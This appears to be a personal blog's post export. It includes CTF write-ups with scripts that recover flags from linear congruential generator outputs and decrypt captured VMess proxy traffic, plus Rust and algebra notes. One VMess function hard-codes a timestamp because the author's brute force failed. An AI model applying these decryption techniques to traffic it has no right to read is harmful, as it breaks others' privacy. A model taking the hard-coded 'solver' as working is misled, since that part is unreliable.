<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed + b) % n</span><br><span class="line">plaintext = seed ^ c</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(plaintext))</span><br></pre></td></tr></table></figure>
<h2 id="lcg-2">lcg_2</h2>
<h3 id="task-2">task</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="solution-2">solution</h3>
<p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = plaintext</span><br><span class="line">seed = (a * seed + b) % n</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">n</span><br><span class="line">---<span class="number">10</span>---&gt; seed</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line">use formula <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_ = invert(a, n)</span><br><span class="line"></span><br><span class="line">seed = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a_ * (seed - b)) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br></pre></td></tr></table></figure>
<h2 id="lcg-3">lcg_3</h2>
<h3 id="task-3">task</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*********************&#125;&#x27;</span></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">seed = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">b = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output1 = &quot;</span>,output[<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output2 = &quot;</span>,output[<span class="number">7</span>])</span><br></pre></td></tr></table></figure>
<h3 id="solution-3">solution</h3>
<p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">n</span><br><span class="line">output = (a * seed + b) % n</span><br><span class="line">	-&gt; output1 = output[<span class="number">6</span>]</span><br><span class="line">	-&gt; output2 = output[<span class="number">7</span>]</span><br><span class="line">b = plaintext</span><br></pre></td></tr></table></figure>
<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># formula 3</span></span><br><span class="line">b = (output2 - a*output1) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br></pre></td></tr></table></figure>
<h2 id="lcg-4">lcg_4</h2>
<h3 id="task-4">task</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>
<h3 id="solution-4">solution</h3>
<p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">seed = (a * seed + b) % n   ---&gt; output</span><br></pre></td></tr></table></figure>
<p><strong>target:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to solve out a, b</span><br><span class="line">a  &lt;---  formula <span class="number">2</span></span><br><span class="line">b  &lt;---  formula <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># solve out a</span></span><br><span class="line">a = invert(output[<span class="number">1</span>] - output[<span class="number">0</span>], n) * (output[<span class="number">2</span>] - output[<span class="number">1</span>]) % n</span><br><span class="line">a_ = invert(a, n)</span><br><span class="line"><span class="comment"># solve out b</span></span><br><span class="line">b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line"><span class="comment"># solve out the initial seed</span></span><br><span class="line">plaintext = a_ * (output[<span class="number">0</span>] - b) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(plaintext))</span><br></pre></td></tr></table></figure>
<h2 id="lcg-5">lcg_5</h2>
<h3 id="task-5">task</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;****************************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>
<h3 id="solution-5">solution</h3>
<p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = (a * seed + b) % n   ---&gt; output</span><br></pre></td></tr></table></figure>
<p><strong>target:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to solve out a, b, m</span><br><span class="line"></span><br><span class="line">m  &lt;--- formula <span class="number">4</span></span><br><span class="line">a  &lt;--- formula <span class="number">2</span></span><br><span class="line">b  &lt;--- formula <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># solve out n</span></span><br><span class="line">t = [output[i + <span class="number">1</span>] - output[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) - <span class="number">1</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] * t[i]</span><br><span class="line"></span><br><span class="line">ns = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) - <span class="number">3</span>):</span><br><span class="line">    ns.append(<span class="built_in">int</span>(gcd(T(i), T(i+<span class="number">1</span>))))</span><br><span class="line">    <span class="comment"># print(ns)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> ns:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># solve out a</span></span><br><span class="line">        a = invert(output[<span class="number">1</span>] - output[<span class="number">0</span>], n) * (output[<span class="number">2</span>] - output[<span class="number">1</span>]) % n</span><br><span class="line">        a_ = invert(a, n)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solve out b</span></span><br><span class="line">        b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solve out the initial seed</span></span><br><span class="line">        plaintext = a_ * (output[<span class="number">0</span>] - b) % n</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(plaintext))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h2 id="lcg-6">lcg_6</h2>
<h3 id="task-6">task</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (seed*a+b)%n</span><br><span class="line">    output.append(seed&gt;&gt;<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>lcg</tag>
        <tag>recursion</tag>
      </tags>
  </entry>
  <entry>
    <title>23-02-14-Abstract</title>
    <url>/2023/02/14/23-02-14-Abstract/</url>
    <content><![CDATA[<p>I am reading <em>Ideal, varieties, and algorithms</em>, however I haven’t learnt the abstract algebra. Thus I will make some records for some typical definitions, which can help me learn well about this book.</p>
<span id="more"></span><!--toc-->
<h1>Fields and Rings</h1>
<p><strong>Def1</strong> a set $k$ and two binary operations $\cdot$ and $+$ defined on $k$.</p>
<h2 id="Conditions">Conditions</h2>
<ul>
<li>$(a + b) + c = a + (b + c)$ and $(a \cdot b) \cdot c = a \cdot(b \cdot c)$ for all $a, b, c$</li>
</ul>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>abstract</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse-Write-Up-Zh</title>
    <url>/2023/03/09/Reverse-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording.</p>
<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust Study</title>
    <url>/2023/06/07/Rust-Study/</url>
    <content><![CDATA[<p>Spend time on studying <code>RUST</code>, stay hungry and stay foolish.</p>
<p>Never give up, keep climbing~</p>
<span id="more"></span><!--toc-->
<h1>Reference</h1>
<blockquote>
<p><a href="https://reberhardt.com/cs110l/spring-2020/">https://reberhardt.com/cs110l/spring-2020/</a></p>
<p><a href="https://course.rs/about-book.html">https://course.rs/about-book.html</a></p>
<p><a href="https://practice.rs/why-exercise.html">https://practice.rs/why-exercise.html</a></p>
<p><a href="https://practice.rs/why-exercise.html">https://practice.rs/why-exercise.html</a></p>
<p><a href="https://www.runoob.com/rust/rust-tutorial.html">https://www.runoob.com/rust/rust-tutorial.html</a></p>
</blockquote>
<h1>Install rust</h1>
<h2 id="fix-success-or-fail">fix success or fail</h2>
<p>After installation, we run <code>rustc -V</code> and <code>cargo -V</code> and will see the details of version.</p>
<img src="/2023/06/07/Rust-Study/1.png" class="" title="successful installation">
<h2 id="local-documents">local documents</h2>
<p>Run <code>rustup doc</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230607150837653.png" class="" title="image-20230607150837653">
<p>When we don’t know how to use the functions, we can find them in <code>API documents</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230607151245332.png" class="" title="image-20230607151245332">
<h1>Build vscode</h1>
<h2 id="run-rust-code">run rust code</h2>
<p>I have installed and compiled the environment of the vscode with rust.</p>
<p>An example.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>compile, build and run.</p>
<img src="/2023/06/07/Rust-Study/image-20230607152934985.png" class="" title="image-20230607152934985">
<img src="/2023/06/07/Rust-Study/image-20230607152958615.png" class="" title="image-20230607152958615">
<p>Using the command line and run <code>main.exe</code>, we can also get the output.</p>
<img src="/2023/06/07/Rust-Study/image-20230607153139931.png" class="" title="image-20230607153139931">
<h2 id="install-plugins">install plugins</h2>
<p>Some recommended plugins.</p>
<ul>
<li>Even Better TOML: support the complete <code>.toml</code></li>
<li>Error Lens: emm, details of the errors. It will impact <code>sagemath</code>. <em>so, I uninstall it</em></li>
<li>One Dark Pro: theme</li>
<li>CodeLLDB: Debugger</li>
</ul>
<h1>Cargo</h1>
<h2 id="compile-project">compile project</h2>
<p>Management about rust.</p>
<p>Run in command line, new the project.</p>
<p>Run <code>cargo run</code>, it will build and compile the project and print the output finally.</p>
<img src="/2023/06/07/Rust-Study/image-20230608145433666.png" class="" title="image-20230608145433666">
<p>It defaults to <code>debug</code> mode. If we want to switch to <code>release</code>  mode to optimize the project, we can run <code>cargo run --release</code> directly.</p>
<img src="/2023/06/07/Rust-Study/image-20230608145805271.png" class="" title="image-20230608145805271">
<p>Use vscode directly, we also achieve the target.</p>
<ul>
<li>cargo
<ul>
<li><code>cargo run</code>  mode: debug</li>
<li><code>cargo build</code>  mode: debug</li>
<li><code>cargo run --release</code>  mode: release</li>
<li><code>cargo build --release</code>  mode: release</li>
<li><code>cargo check</code>  check that the project code can be run if the size of project is too large.</li>
</ul>
</li>
<li>vscode
<ul>
<li>Use according to what you need.</li>
</ul>
</li>
</ul>
<h2 id="cargo-documents">cargo documents</h2>
<p><code>cargo.toml</code> and <code>cargo.lock</code> are the core part of cargo. All things about cargo are about these two documents.</p>
<ul>
<li><code>cargo.toml</code>: description of project data, which is import for the rust project.</li>
<li><code>cargo.lock</code>: detailed manifest of project dependencies, which is mainly depended on the rust project itself.</li>
</ul>
<p><code>cargo.toml</code> is like this. It first shows the details about the project, containing <code>name</code>/<code>version</code>/<code>edition</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230608163001582.png" class="" title="image-20230608163001582">
<p>Second it shows what it depends on. There are three ways to introduce dependencies.</p>
<ul>
<li>based on <code>crates.io</code>: specify version information</li>
</ul>
]]></content>
      <categories>
        <category>Language</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>MISC-Write-Up-Zh</title>
    <url>/2023/03/09/MISC-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording.</p>
<span id="more"></span><!--toc-->
<h1>[qwb2022]谍影重重</h1>
<blockquote>
<p><a href="https://blog.gztime.cc/posts/2022/fc697ca8/#%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D">强网杯 2022 Writeup | GZTime’s Blog</a></p>
<p><a href="http://www.ehangwang.cn/article/detail/post-548934.html">2022年第六届“强网杯”网络安全大赛部分writeup (ehangwang.cn)</a></p>
</blockquote>
<ul>
<li>Route.pcapng</li>
<li>config.json</li>
<li>Amazing.zip</li>
</ul>
<p><code>Amazing.zip</code>为加密压缩包，加密文件为<code>flag</code>，基本判断通过其他两个文件得到压缩包的解压密码。打开压缩包也得到了明确的提示。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423153123627.png" class="" title="image-20230423153123627">
<h2 id="vmess协议">vmess协议</h2>
<blockquote>
<p>[协议细节 - VMess 协议 - 《Project V（V2RAY）文档手册》 - 书栈网 · BookStack](<a href="https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md#VMess">https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md#VMess</a> 协议)</p>
<p><a href="https://github.com/v2fly/v2ray-core">v2fly/v2ray-core: A platform for building proxies to bypass network restrictions. (github.com)</a></p>
</blockquote>
<p>主要就是看手册分析协议内容，根据协议定义进行计算。</p>
<p><strong>时刻注意调用函数的格式，是字符串还是字节！本题基本都是字节。</strong></p>
<h3 id="协议初始定义">协议初始定义</h3>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163404592.png" class="" title="image-20230423163404592">
<h3 id="计算cmd-key以及cmd-iv">计算cmd_key以及cmd_iv</h3>
<p>根据协议，先把指令部分求解出来。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423154043446.png" class="" title="image-20230423154043446">
<p>我们的用户ID在<code>config.json</code>中体现。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;clients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>使用匿名函数<code>lambda</code>把一些本题的常用函数给定义一下，简化调用步骤。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure>
<p>可以从协议定义来看，关键点在<code>M</code>之上。所以我们需要利用<code>hmac</code>值，爆破出关键的时间点<code>M</code>。</p>
<p><em>但这一步莫名其妙一直没成功，无法爆出需要的时间，所以还有待改进中。不是python版本问题。</em></p>
<p>根据协议提示，写获取<code>M</code>的函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 理论上</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="keyword">if</span> cur_hash == target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;time    = <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"><span class="comment"># 硬凑版</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p><em>p64()在pwntools库中，需要进行安装。</em></p>
<p><strong>前置条件，需要找到进行响应的数据包</strong>基本条件：时间较早；数据量较大；存在数据。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155136573.png" class="" title="image-20230423155136573">
<p>大概的时间范围，以该流量包中的时间进行时间戳的转换。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155417341.png" class="" title="image-20230423155417341">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155718632.png" class="" title="image-20230423155718632">
<p>找到参照时间戳为<code>1615528962</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">client_id = uuid.UUID(<span class="string">&#x27;b831381d-6324-4d53-ad4f-8cda48b30811&#x27;</span>).<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br><span class="line"></span><br><span class="line">req = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;4dd11f9b04f2b562b9db539d939f1d52&#x27;</span> + <span class="string">&#x27;b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26&#x27;</span>)</span><br><span class="line"><span class="comment"># print(req)</span></span><br><span class="line">cut_time = <span class="number">1615528962</span></span><br><span class="line">target_hash = req[:<span class="number">16</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(target_hash)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd_key = md5(client_id + <span class="string">b&#x27;c48619fe-8f02-49e0-b9e9-edf763e17e21&#x27;</span>)</span><br><span class="line">cmd_iv = get_cmd_iv(cut_time, target_hash)</span><br><span class="line"><span class="comment"># print(type(cmd_iv))</span></span><br><span class="line"><span class="comment"># print(type(cmd_key))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_key  = <span class="subst">&#123;cmd_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_iv   = <span class="subst">&#123;cmd_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># time     = 1615528982</span></span><br><span class="line"><span class="comment"># cmd_key  = &quot;b50d916ac0cec067981af8e5f38a758f&quot;</span></span><br><span class="line"><span class="comment"># cmd_iv   = &quot;881eb47d4d3b67b24328c5178c0eedcc&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="对指令部分进行解密">对指令部分进行解密</h3>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423160041040.png" class="" title="image-20230423160041040">
<p>根据协议手册，我们了解指令部分各字节的所属以及作用。需要注意的是，我们在此解密的数据是指令数据。</p>
<p>同样的，先利用匿名函数定义所要使用的<code>AES-128-CFB</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br></pre></td></tr></table></figure>
<p><em><strong>这边得高亮一下，python3中对称密码的使用非常麻烦，因为主要处理的数据都是字节形式，此处注意，不能直接使用b’'来进行转换，会导致长度错误，必须使用<code>bytes.fromhex()</code>进行转换。</strong></em></p>
<p><em>AES-128的密钥长度必须为16字节，而b’'转换成字节是32字节，所以会导致报错。</em></p>
<p>校验<code>F</code>部分，使用<code>FNV1a hash</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423161516817.png" class="" title="image-20230423161516817">
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fnvhash <span class="keyword">import</span> fnv1a_32</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">cmd = req[<span class="number">16</span>:]</span><br><span class="line">ret = cmd_aes().decrypt(cmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ver      = <span class="subst">&#123;ret[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;ret[<span class="number">1</span>:<span class="number">17</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;ret[<span class="number">17</span>:<span class="number">33</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;ret[<span class="number">33</span>:<span class="number">34</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;ret[<span class="number">34</span>]:b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p        = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;sec      = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">p = <span class="built_in">int</span>(ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;ret[<span class="number">37</span>:<span class="number">38</span>].<span 